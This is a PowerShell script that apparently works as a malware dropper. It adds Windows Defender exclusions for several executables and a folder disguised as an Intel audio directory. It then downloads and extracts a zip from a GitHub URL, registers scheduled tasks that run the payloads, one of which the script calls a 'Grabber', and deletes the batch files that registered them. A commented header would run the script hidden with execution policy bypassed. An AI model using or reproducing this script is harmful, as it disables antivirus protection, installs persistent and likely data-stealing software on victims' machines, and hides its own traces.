# PowerShell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Out-Null"

$TargetPath     = "C:\ProgramData\Intel\Audio"
$TargetZip      = "$TargetPath\audiotools.zip"
$TargetFile     = "$TargetPath\AudioTools.exe"
$TargetGrabber  = "$TargetPath\Notify.exe"
$TargetSchedule = "$TargetPath\Schedule.exe"
$TargetSystem   = "$env:APPDATA\Microsoft\Windows\StartMenu\Programs\Startup\System.exe"
$TargetSBat     = "$TargetPath\Register_Schedule.bat"
$TargetABat     = "$TargetPath\Register_AudioTools.bat"
$TargetNBat     = "$TargetPath\Register_Notify.bat"

Add-MpPreference -ExclusionProcess 'AudioTools.exe' -Force
Add-MpPreference -ExclusionProcess 'Notify.exe' -Force
Add-MpPreference -ExclusionProcess 'Schedule.bat' -Force
Add-MpPreference -ExclusionProcess 'System.exe' -Force
Add-MpPreference -ExclusionPath "$TargetPath" -Force
Add-MpPreference -ExclusionPath "$TargetFile" -Force
Add-MpPreference -ExclusionPath "$TargetGrabber" -Force
Add-MpPreference -ExclusionPath "$TargetSchedule" -Force
Add-MpPreference -ExclusionPath "$TargetSystem" -Force

if (Get-Process -Name "AudioTools" -ErrorAction SilentlyContinue) {
  $ProcID = (Get-Process -Name "AudioTools").Id
  Stop-Process -Id $ProcID -Force
}

if (Test-Path "$TargetPath") {
  Remove-Item -Recurse -Force -Path "$TargetPath"
  New-Item -Path "$TargetPath" -ItemType Directory -Force
} else {
  New-Item -Path "$TargetPath" -ItemType Directory -Force
}

  Invoke-WebRequest -Uri "https://github.com/B95segal/audiotools/raw/refs/heads/main/audiotools.zip" -OutFile "$TargetZip"
  Expand-Archive -Path "$TargetZip" -DestinationPath "$TargetPath"
  Remove-Item -Path "$TargetZip"

if (Get-ScheduledTask -TaskName "AudioTools" -ErrorAction SilentlyContinue) {
  Invoke-Expression -Command "schtasks.exe /delete /TN 'Apps\AudioTools' /f"
  & $TargetABat
} else {
  & $TargetABat
}

if (Get-ScheduledTask -TaskName "Notify" -ErrorAction SilentlyContinue) {
  Invoke-Expression -Command "schtasks.exe /delete /TN 'Apps\Notify' /f"
  & $TargetNBat
} else {
  & $TargetNBat
}

if (Get-ScheduledTask -TaskName "Schedule" -ErrorAction SilentlyContinue) {
  Invoke-Expression -Command "schtasks.exe /delete /TN 'Apps\Schedule' /f"
  & $TargetSBat
} else {
  & $TargetSBat
}



Remove-Item -Path $TargetPath\Register_AudioTools.bat -Force
Remove-Item -Path $TargetPath\Register_Notify.bat -Force
Remove-Item -Path $TargetPath\Register_Schedule.bat -Force

# Restart-Computer -Force